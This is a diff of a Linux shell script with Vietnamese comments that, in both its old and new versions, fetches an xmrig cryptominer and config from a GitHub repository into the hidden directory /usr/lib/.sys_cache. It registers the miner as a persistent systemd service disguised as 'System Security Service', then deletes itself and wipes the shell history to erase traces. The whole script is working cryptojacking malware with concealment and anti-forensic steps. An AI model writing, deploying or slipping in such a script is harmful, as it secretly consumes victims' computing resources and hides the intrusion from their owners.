@@ -1,42 +1,36 @@
 #!/bin/sh
 
-# 1. Kiểm tra quyền root (Sử dụng [ ] thay vì [[ ]] để tương thích sh)
-if [ "$(id -u)" -ne 0 ]; then
-   echo "Vui lòng chạy với quyền sudo hoặc root."
-   exit 1
+# Kiem tra root bang cach thu tao file (cach nay sh nao cung chay duoc)
+touch /etc/.test_permission 2>/dev/null
+if [ $? -ne 0 ]; then
+    echo "Hay dung sudo."
+    exit 1
 fi
+rm /etc/.test_permission
 
-# 2. Khai báo các thông số
-SERVICE_NAME="sys_update"
-DISPLAY_NAME="System Security Service"
-INSTALL_DIR="/usr/lib/.sys_cache"
-EXEC_NAME="sys_mgr"
-CONF_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json"
-BIN_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig"
+# Bien cau hinh
+S_NAME="sys_update"
+DIR="/usr/lib/.sys_cache"
+BIN="$DIR/sys_mgr"
+CONF="$DIR/config.json"
 
-# 3. Dọn dẹp các phiên bản cũ nếu có
-systemctl stop $SERVICE_NAME.service >/dev/null 2>&1
-systemctl disable $SERVICE_NAME.service >/dev/null 2>&1
-rm -rf "$INSTALL_DIR"
+# Don dep va Tai file
+systemctl stop $S_NAME 2>/dev/null
+mkdir -p $DIR
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o $CONF
+curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o $BIN
+chmod +x $BIN
 
-# 4. Tạo thư mục và tải file
-mkdir -p "$INSTALL_DIR"
-curl -sL "$CONF_URL" -o "$INSTALL_DIR/config.json"
-curl -sL "$BIN_URL" -o "$INSTALL_DIR/$EXEC_NAME"
-
-# 5. Cấp quyền thực thi
-chmod +x "$INSTALL_DIR/$EXEC_NAME"
-
-# 6. Tạo Service File (Sử dụng đường dẫn tuyệt đối cho an toàn)
-cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
+# Tao Service
+cat <<EOF > /etc/systemd/system/$S_NAME.service
 [Unit]
-Description=$DISPLAY_NAME
+Description=System Security Service
 After=network.target
 
 [Service]
 Type=simple
-WorkingDirectory=$INSTALL_DIR
-ExecStart=$INSTALL_DIR/$EXEC_NAME --config=$INSTALL_DIR/config.json
+WorkingDirectory=$DIR
+ExecStart=$BIN --config=$CONF
 Restart=always
 RestartSec=15
 
@@ -44,15 +38,12 @@ RestartSec=15
 WantedBy=multi-user.target
 EOF
 
-# 7. Kích hoạt Service
+# Chay service
 systemctl daemon-reload
-systemctl enable $SERVICE_NAME.service >/dev/null 2>&1
-systemctl start $SERVICE_NAME.service
+systemctl enable $S_NAME >/dev/null 2>&1
+systemctl start $S_NAME
 
-# 8. Xóa dấu vết (Self-destruct và xóa lịch sử)
-# Xóa file script này
+# Xoa dau vet
 rm -- "$0"
-
-# Làm sạch lịch sử câu lệnh
 cat /dev/null > ~/.bash_history
 history -c 2>/dev/null
